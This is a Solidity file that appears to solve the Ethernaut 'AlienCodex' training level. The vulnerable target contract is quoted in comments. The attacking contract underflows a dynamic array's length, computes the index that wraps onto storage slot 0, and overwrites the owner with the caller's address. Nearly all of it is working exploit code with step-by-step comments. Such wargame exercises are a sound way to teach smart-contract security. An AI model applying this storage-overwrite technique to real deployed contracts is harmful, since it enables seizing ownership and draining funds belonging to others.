// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

// ethernaut ca 0xf7A45CA79F2629cD2797Bb49F38651122BC94F95

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}
contract AlienCodexContactor{
    IAlienCodex public target;
    address public me;
    constructor(address alienCodex){
        target = IAlienCodex(alienCodex);
        me = msg.sender;
        // make contact//
        target.makeContact();
        target.retract(); // len overflow
        // now I can use revise if I know which index the codex overlaps with slot 0
        // so let's say at slot 0, we have bool contacted and owner
         // because codex is a dynamic array
        // slot 1 is codex len
        // where will be the first ele of the codex start?
        // ele at index0 is at slot location keccak(1) + 0
        // ele at index1 is at slot location keccak(1) + 1
        // ele at index2 is at slot location keccak(1) + 2
        // at which index is ele at keccak(1) + index = 0?
        // solve for i?
        // index = -keccak(1)?
        uint256 index;
        unchecked{
            index -= uint256(keccak256(abi.encode(uint256(1))));
        }
        //this will rightpad the slot with 0s, so contacted will be false again
        target.revise(index, bytes32(uint256(uint160(msg.sender))));
        
    }

   
}

// pragma solidity ^0.5.0;

// import '../helpers/Ownable-05.sol';

// contract AlienCodex is Ownable {

//   bool public contact;
//   bytes32[] public codex;

//   modifier contacted() {
//     assert(contact);
//     _;
//   }
  
//   function makeContact() public {
//     contact = true;
//   }

//   function record(bytes32 _content) contacted public {
//     codex.push(_content);
//   }

//   function retract() contacted public {
//     codex.length--;
//   }

//   function revise(uint i, bytes32 _content) contacted public {
//     codex[i] = _content;
//   }
// }